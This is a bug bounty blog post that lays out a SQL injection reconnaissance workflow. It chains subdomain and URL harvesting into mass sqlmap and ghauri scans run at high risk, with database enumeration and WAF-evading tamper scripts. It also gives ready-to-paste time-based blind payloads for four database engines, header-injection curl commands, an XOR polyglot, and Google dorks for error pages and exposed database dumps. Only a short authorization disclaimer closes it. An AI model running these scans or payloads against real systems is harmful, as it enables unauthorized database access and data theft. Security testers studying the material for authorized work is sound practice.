Mastering SQL Injection Recon: Step-by-Step Guide for Bug Bounty Hunters
A practical guide to uncovering SQL injection flaws using automation, payloads and deep reconnaissance techniques.
coffinxp
coffinxp

Following
7 min read
·
May 20, 2025
406


6






Introduction
SQL Injection remains one of the most critical web vulnerabilities, allowing attackers to manipulate backend databases through unsanitized inputs. Effective reconnaissance is key to identifying potential SQLi points before exploitation. This article walks you through a practical, step-by-step SQLi reconnaissance methodology using popular tools and payloads.

Step 1: Recon the Target Subdomains
Before testing for SQLi you need to discover the attack surface the subdomains and URLs that might be vulnerable.

For a single domain use:

subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
For multiple subdomains listed in a file (subdomains.txt):

subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

This pipeline enumerates subdomains, probes them for live hosts and filters URLs with extensions commonly associated with dynamic web pages that might be vulnerable to SQLi.

Step 2: Discovering Potential SQL Injection Endpoints
To find URLs with parameters (common SQLi entry points) use:

echo https://example.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "=" >urls.txt
Or with Katana for deeper crawling require older version:

echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" >urls2.txt

These commands gather URLs from various sources and filter those with query parameters which are prime candidates for SQLi testing.

Step 3: Identify SQL-Prone URLs
Use gf to extract endpoints with potential SQL injection points and Clean them up:

cat urls1.txt urls2.txt | gf sqli | uro > cleaned-sql.txt
The command gf sqli > cleaned-sql.txt uses the gf tool with the sqli pattern, which scans URLs or parameters for common SQL injection indicators like suspicious query strings or payloads. Then uro cleans and removes duplicates from that list for easier testing.

Automate Mass SQL Injection Testing
Once you have a list of URLs, automate testing with tools like ghauri or sqlmap:

ghauri -m cleaned-sql.txt --batch --dbs --level 3 --confirm
sqlmap -m cleaned-sql.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs
To quickly find and test SQL injection points, combine subdomain discovery and URL gathering with filtering and automated scanning. Use gf pattren to extract potential SQLi URLs then run ghauri or sqlmap for confirmation and database enumeration.

Using ghauri:


subfinder -d example.com -all -silent | gau --threads 50 | uro |
gf sqli > sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm
Using sqlmap:


subfinder -d example.com -all -silent | gau | urldedupe |
gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
These commands automate SQLi detection and database enumeration, saving time and increasing accuracy.

Using Time-Based Blind SQL Injection Payloads
Time delays are effective for blind SQLi detection when no error messages are shown. Here are payloads for manual testing for different databases:

MySQL
-- Basic time-based delay
SELECT SLEEP(10);

-- Inline injection with logic
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z

-- Using benchmark for delay (CPU-based)
1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(FLOOR(RAND()*2),(SELECT SLEEP(5))) AS x FROM information_schema.tables GROUP BY x) y);

-- Boolean logic delay
' OR IF(1=1, SLEEP(10), 0)-- -
PostgreSQL
-- Standard time-based delay
SELECT pg_sleep(10);

-- Conditional delay with string concatenation
' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < interval '0:0:10') 
     THEN (SELECT '1' || pg_sleep(10)) ELSE '0' END)='1

-- More concise version
' OR 1=1; SELECT pg_sleep(5);-- 

-- Using random() for variability
' OR (SELECT CASE WHEN (random() < 0.5) THEN pg_sleep(5) ELSE pg_sleep(0) END);--
Microsoft SQL Server
-- Basic delay
WAITFOR DELAY '00:00:10';

-- Inline SQLi payload
'; WAITFOR DELAY '00:00:05'; --

-- Conditional delay
IF (1=1) WAITFOR DELAY '0:0:10';

-- Using IF EXISTS for more realism
'; IF EXISTS (SELECT * FROM users) WAITFOR DELAY '00:00:07';--
Oracle
-- Basic time delay using DBMS_PIPE
BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;

-- SQLi inline payload
' OR 1=1; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;--

-- Conditional check with delay
DECLARE v INTEGER; BEGIN IF 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END IF; END;
Header-Based SQLi Testing
Some endpoints reflect headers like User-Agent, Referer or X-Forwarded-For. Inject payloads there:

examples:

User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'"
Using curl to confirm time delays:

time curl -s -H "User-Agent: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"

time curl -s -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" "https://target.com/vulnerable-endpoint"

time curl -s -H "Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\"" "https://target.com/vulnerable-endpoint"
Mastering XOR-Based SQL Injection Techniques
Explore how XOR logic in SQL payloads like if(now()=sysdate(),sleep(10),0) can be weaponized for bypassing filters and triggering precise time-based detection.

using xor pollyglots:
if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/
test using curl
time curl "https://target.com/page.php?id=if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/"

If the server takes approximately 10 seconds to respond, it strongly indicates a time-based SQL injection vulnerability.

You can also download a full list of advanced XOR-based SQL injection payloads and for other Dbms also from my GitHub repository here:

loxs/payloads/sqli at main · coffinxp/loxs
best tool for finding SQLi,CRLF,XSS,LFi,OpenRedirect - loxs/payloads/sqli at main · coffinxp/loxs
github.com

Advanced Google Dorking for SQL Injection Recon
Google dorks can help find potentially vulnerable pages. Use the following Google dorks to identify endpoints, parameterized URLs and database error-prone pages that could indicate SQL injection potential.

Find URLs with Query Parameters
These are the most likely candidates for SQL injection testing:

By Parameters in URL
site:*.domain.com inurl:id=
site:*.domain.com inurl=product.php?id=
site:*.domain.com inurl=view.php?page=
site:*.domain.com inurl=item.php?cat=
By File Extension
site:*.domain.com ext:php
site:*.domain.com ext:asp
site:*.domain.com ext:aspx
site:*.domain.com ext:jsp
site:*.domain.com ext:jspx
site:*.domain.com ext:cfm
site:*.domain.com ext:pl
Combine Extension + Parameters for Accuracy
site:*.domain.com ext:php inurl:id=
site:*.domain.com ext:aspx inurl=productid=
site:*.domain.com ext:jsp inurl=categoryid=
Error-based Fingerprinting
# MySQL Errors
site:*.domain.com intext:"You have an error in your SQL syntax"
site:*.domain.com intext:"mysql_fetch_array() expects parameter"
site:*.domain.com intext:"mysql_num_rows() expects parameter"
site:*.domain.com intext:"supplied argument is not a valid MySQL result resource"
site:*.domain.com intext:"Warning: mysql_"
site:*.domain.com intext:"Fatal error: Uncaught mysqli_sql_exception"

# MariaDB / PDO Errors
site:*.domain.com intext:"Fatal error: Call to undefined function mysql_connect()"
site:*.domain.com intext:"Warning: PDO::query()"
site:*.domain.com intext:"SQLSTATE[HY000]"

# PostgreSQL Errors
site:*.domain.com intext:"pg_query(): Query failed"
site:*.domain.com intext:"Warning: pg_connect()"
site:*.domain.com intext:"PostgreSQL query failed: ERROR"

# Microsoft SQL Server Errors
site:*.domain.com intext:"Microsoft OLE DB Provider for SQL Server"
site:*.domain.com intext:"Unclosed quotation mark after the character string"
site:*.domain.com intext:"ADODB.Field error"
site:*.domain.com intext:"80040e14"

# Oracle DB Errors
site:*.domain.com intext:"ORA-00933: SQL command not properly ended"
site:*.domain.com intext:"ORA-01756: quoted string not properly terminated"
site:*.domain.com intext:"Warning: oci_parse()"

# DB2 / Informix / Misc
site:*.domain.com intext:"DB2 SQL error:"
site:*.domain.com intext:"Syntax error in string in query expression"
site:*.domain.com intext:"Error Executing Database Query"

# Generic SQL Error Patterns
site:*.domain.com intext:"Query failed:"
site:*.domain.com intext:"unexpected end of SQL command"
site:*.domain.com intext:"invalid SQL statement"
site:*.domain.com intext:"JDBC Exception"
Find Exposed Database Dumps or Config Files
site:example.com ext:sql | ext:db | ext:dbf | ext:bak | ext:old | ext:backup
intitle:"index of" "db.sql"
intitle:"index of" "database.sql"
intitle:"index of" "dump.sql"
Google Dork automation
You can automate these dorks using my custom dorking script to quickly discover more SQL injection points. I’ve also written an article covering some advanced techniques including Google Dorking Automation. check it out here:

The Ultimate Guide to WAF Bypass Using SQLMap, Proxychains & Tamper Scripts
Mastering Advanced SQLMap Techniques with Proxychains and tamper scripts Against Cloudflare and ModSecurity
infosecwriteups.com

scripts/dorking.py at main · coffinxp/scripts
Contribute to coffinxp/scripts development by creating an account on GitHub.
github.com

Using Loxs tool
You can also test time-based payloads for all types of DBMS using our Loxs tool, which is specially designed to detect time-based SQL injection vulnerabilities effectively.

GitHub - coffinxp/loxs: best tool for finding SQLi,CRLF,XSS,LFi,OpenRedirect
best tool for finding SQLi,CRLF,XSS,LFi,OpenRedirect - coffinxp/loxs
github.com

Bypass WAF & Find SQL Injection Using Origin IP
Did you know that many websites protected by WAFs can still be vulnerable through their origin IP? In this article, I explain how to bypass WAF protections and discover hidden SQL injection points by targeting the server’s original IP address

Read it here:

SQL injection in largest Electricity Board of Sri Lanka
SQL injection bypass by origin ip
infosecwriteups.com

Resources to Master SQL Injection
Want to master SQL Injection from the ground up? These videos covers essential tools, techniques and learning resources to help you go from beginner to pro in no time.

Tips
Test both GET and POST requests.
Try tamper scripts like space2comment, between, or charencode with sqlmap.
Mix payloads into JSON bodies, XML, headers and cookies.
Monitor 5xx errors, long delays, and unusual behavior — even without data extraction.
Use a proxy like Burp to see responses in real-time.
Conclusion
SQL Injection reconnaissance is a multi-step process involving subdomain enumeration, URL discovery, mass testing and payload injection. Using the right tools and payloads tailored for different databases increases your chances of finding vulnerabilities efficiently.

Upnext: If you found this helpful, you’ll definitely want to check out my article Master CRLF Injection: The Underrated Bug with Dangerous Potential. It’s packed with real payloads, bypass tricks and chaining techniques for serious impact 👇

Master CRLF Injection: The Underrated Bug with Dangerous Potential
Learn how attackers exploit CRLF Injection to manipulate HTTP responses, hijack headers and unlock hidden…
infosecwriteups.com

Disclaimer
The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly
